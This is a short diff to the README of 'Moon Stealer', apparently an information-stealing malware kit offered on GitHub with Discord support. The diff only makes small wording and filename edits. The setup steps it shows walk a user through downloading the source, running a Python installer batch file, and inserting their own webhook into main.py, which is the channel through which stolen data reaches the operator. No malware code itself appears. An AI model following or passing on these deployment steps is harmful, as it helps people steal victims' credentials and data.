@@ -17,15 +17,15 @@ Moon Stealer (ムーン)
 ### If you get any errors, please do not hesitate to contact Ultraviolet#9999 on discord!
 ### [Need help setting up? Join our Discord server!](https://discord.gg/JCYhMjQsNJ)
 
-### < Setup >
+### Setup
 
 1. [Download source code zip](https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip)
 
 2. Extract zip
 
-3. Run `install_python.bat` if you don't have python installed
+3. Run `Get-Python.bat` if you don't have python installed
 
-4. Open `main.py` any text editor such as notepad.
+4. Open `main.py` with any text editor such as notepad.
 
 5. Replace X with your webhook `hook = "X"`
 
